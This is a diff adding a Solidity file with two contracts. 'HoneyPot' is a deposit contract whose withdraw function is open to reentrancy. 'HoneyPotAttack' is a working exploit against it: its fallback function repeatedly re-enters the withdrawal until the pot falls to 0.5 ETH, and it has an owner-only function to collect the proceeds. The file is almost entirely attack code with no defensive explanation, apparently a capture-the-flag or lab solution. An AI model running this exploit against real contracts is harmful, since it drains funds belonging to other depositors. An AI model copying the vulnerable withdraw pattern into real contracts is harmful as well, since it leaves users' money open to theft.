@@ -1,0 +1,61 @@
+pragma solidity ^0.4.18;
+
+// FINAL
+
+contract HoneyPot {
+    mapping (address => uint) public balances;
+
+    function HoneyPot() payable {
+        put();
+    }
+
+    function put() payable {
+        balances[msg.sender] = msg.value;
+    }
+
+    function get() {
+        require(msg.sender.call.value(balances[msg.sender])());
+        balances[msg.sender] = 0;
+    }
+
+    function() {
+        revert();
+    }
+    
+    function getBalance() public view returns (uint256) { return this.balance; }
+}
+
+contract HoneyPotAttack {
+    HoneyPot public hp;
+    address public owner;
+    uint256 constant public BOTTOM = 500000000000000000; // leave 0.5 ETH for others
+    
+    function HoneyPotAttack(HoneyPot _hp) public {
+        owner = msg.sender;
+        hp = _hp;
+    }
+    
+    // deposit funds into the honeypot
+    function put() public payable {
+        hp.put.value(msg.value)();
+    }
+ 
+    // get funds from the honeypot, multiple times deposited amount
+    function get() public {
+        hp.get();
+    }
+    
+    function() public payable {
+        if (hp.balance > BOTTOM) {
+            hp.get();
+        }
+    }
+    
+    // attacker calls this to withdraw funds
+    function withdraw() public {
+        require(msg.sender == owner);
+        msg.sender.transfer(this.balance);
+    }
+
+    function getBalance() public view returns (uint256) { return this.balance; }
+}
